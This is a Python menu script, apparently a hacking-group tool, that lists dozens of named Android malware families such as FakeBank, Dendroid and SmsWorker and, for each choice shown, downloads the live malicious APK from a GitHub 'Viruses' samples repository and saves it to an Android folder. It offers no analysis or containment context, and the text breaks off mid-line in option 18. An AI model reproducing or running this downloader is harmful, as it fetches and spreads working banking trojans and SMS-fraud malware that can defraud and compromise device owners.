#!/usr/bin/python
# -*- coding: utf-8 -*-
#####DONT CHANGE THIS########
import sys,os,platform
from time import *
x = platform.system()
import requests
from tqdm import tqdm
	#--- Color  ---#
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
fun = "Download Succes ^_^"

now = strftime("%T")
bulan = strftime("%B")
tahun = strftime("%Y")
#--- Def menu ---#
def banner():
    os.system('printf "\t\t_  _ ____ _    _ ____ _ ____ _  _ ____\n\t\t|\/| |__| |    | |    | |  | |  | [__ \n\t\t|  | |  | |___ | |___ | |__| |__| ___]\n\n" | lolcat')     
    #print(""+R+"I "+C+"████╗ ████║██╔══██╗██║     ██║██╔════╝██║██╔═══██╗██║   ██║██╔════╝ "+R+"I")     
    #print(""+R+"R "+C+"██╔████╔██║███████║██║     ██║██║     ██║██║   ██║██║   ██║███████╗ "+R+"R")     
#    print(""+R+"U "+C+"██║╚██╔╝██║██╔══██║██║     ██║██║     ██║██║   ██║██║   ██║╚════██║ "+R+"U")    
#    print(""+R+"S "+C+"██║ ╚═╝ ██║██║  ██║███████╗██║╚██████╗██║╚██████╔╝╚██████╔╝███████║ "+R+"S")    
#    print(""+R+"! "+C+"╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ "+R+"!")    
def about():
	print("\t\t"+B+"<<<<<<| "+R+"About Tool "+B+"|>>>>>>\n")
	print("\t"+G+"Made"+B+" with full"+R+" <3"+B+"\t\t")
	print("\tAuthor  : Hider5\t\t\t")
	print("\tVersion : 1.1\t\t\t")
	print("\tTeam    : "+R+"LoOlzec Security")
	print("\t"+B+"Thanks to Deray")
	menu()
	
def banner2():
	print(""+O+"")
	
def fontcolor():
	print(""+W+"")
#######DONT CHANGE THIS#########

#################### START ANDROID
def Vandroid():
	print(""+O+"["+R+"1"+O+"] Agent\t\t["+R+"15"+O+"] Elite\t\t["+R+"29"+O+"] Prasesfee")
	print(""+O+"["+R+"2"+O+"] Badnews\t\t["+R+"16"+O+"] Omigo\t\t["+R+"30"+O+"] RecipeSmart")
	print(""+O+"["+R+"3"+O+"] Bios\t\t["+R+"17"+O+"] Opfake\t\t["+R+"31"+O+"] Romaticpos")
	print(""+O+"["+R+"4"+O+"] BlatanSMS\t\t["+R+"18"+O+"] SmsWorker\t\t["+R+"32"+O+"] Statetss")
	print(""+O+"["+R+"5"+O+"] BrainTest\t\t["+R+"19"+O+"] Vietcon\t\t["+R+"33"+O+"] Thinking")
	print(""+O+"["+R+"6"+O+"] Claco\t\t["+R+"20"+O+"] Candycorn\t\t["+R+"34"+O+"] Crd")
	print(""+O+"["+R+"7"+O+"] DropDialer\t\t["+R+"21"+O+"] Cat\t\t["+R+"35"+O+"] Dendroid")
	print(""+O+"["+R+"8"+O+"] FakeBank\t\t["+R+"22"+O+"] Chistescortos\t["+R+"36"+O+"] Ds")
	print(""+O+"["+R+"9"+O+"] FakeCMCC\t\t["+R+"23"+O+"] Chistespicanticos\t["+R+"37"+O+"] Facebook")
	print(""+O+"["+R+"10"+O+"] FakeDoc\t\t["+R+"24"+O+"] ComFunnys\t\t["+R+"38"+O+"] Fakeav")
	print(""+O+"["+R+"11"+O+"] FakeValidation\t["+R+"25"+O+"] ComImagePets\t["+R+"39"+O+"] ArtStation")
	print(""+O+"["+R+"12"+O+"] Fobus\t\t["+R+"26"+O+"] ComKitchen\t\t["+R+"40"+O+"] MusicPlayer")
	print(""+O+"["+R+"13"+O+"] GinMaster\t\t["+R+"27"+O+"] ComLaughtter\t["+R+"41"+O+"] Settings")
	print(""+O+"["+R+"14"+O+"] Masnu\t\t["+R+"28"+O+"] Prasesamor\t\t["+R+"42"+O+"] Back")
	
	try:
		menu1 = input("Input Number > "+R+"")
		if menu1 == 1:#############done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Agent.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Agent.apk?raw=true' Android/Agent.apk")
			print(fun)######done
			
		elif menu1 == 2:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/BadNews.A.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'BadNews.A.apk?raw=true' Android/BadNews.apk")
			print(fun)#######done
		
		elif menu1 == 3:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Bios.NativeMaliciousCode.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Bios.NativeMaliciousCode.apk?raw=true' Android/Bios.apk")
			print(fun)#####done
			
		elif menu1 == 4:########done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Blatantsms.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Blatantsms.apk?raw=true' Android/Blatantsms.apk")
			print(fun)#####done
			
		elif menu1 == 5:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/BrainTest.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'BrainTest.apk?raw=true' Android/BrainTest.apk")
			print(fun)#####done
			
		elif menu1 == 6:##########done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Claco.A.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Claco.A.apk?raw=true' Android/Claco.apk")
			print(fun)#####done
			
		elif menu1 == 7:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Dropdialer.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Dropdialer.apk?raw=true' Android/DropDialer.apk")
			print(fun)#####done
			
		elif menu1 == 8:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeBank.B.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeBank.B.apk?raw=true' Android/FakeBank.apk")
			print(fun)#####done
			
		elif menu1 == 9:######done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeCMCC.A.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeCMCC.A.apk?raw=true' Android/FakeCMCC.apk")
			print(fun)#####done
		
		elif menu1 == 10:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeDoc.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeDoc.apk?raw=true' Android/FakeDoc.apk")
			print(fun)#####done
			
		elif menu1 == 11:#####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/FakeValidation.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'FakeValidation.apk?raw=true' Android/FakeValidation.apk")
			print(fun)#####done
			
		elif menu1 == 12:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Fobus.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Fobus.apk?raw=true' Android/Fobus.apk")
			print(fun)#####done
			
		elif menu1 == 13:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/GinMaster.Z.AdvancedObfuscation.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'GinMaster.Z.AdvancedObfuscation.apk?raw=true' Android/GinMaster.apk")
			print(fun)#####done
			
		elif menu1 == 14:###done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Masnu.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Masnu.apk?raw=true' Android/Masnu.apk")
			print(fun)#####done
			
		elif menu1 == 15:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Minecraft2.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Minecraft2.apk?raw=true' Android/Elite.apk")
			print(fun)#####done
			
		elif menu1 == 16:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Omigo.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Omigo.apk?raw=true' Android/Omigo.apk")
			print(fun)#####done
			
		elif menu1 == 17:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/Opfake.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
			os.system("mv 'Opfake.apk?raw=true' Android/Opfake.apk")
			print(fun)#####done
			
		elif menu1 == 18:####done
			print(""+G+"")
			chunk_size = 1024
			url = 'https://github.com/Ractomes/Viruses/blob/master/samples/SmsWorker.apk?raw=true'
			r = requests.get(url, stream = True)
			size = int(r.header
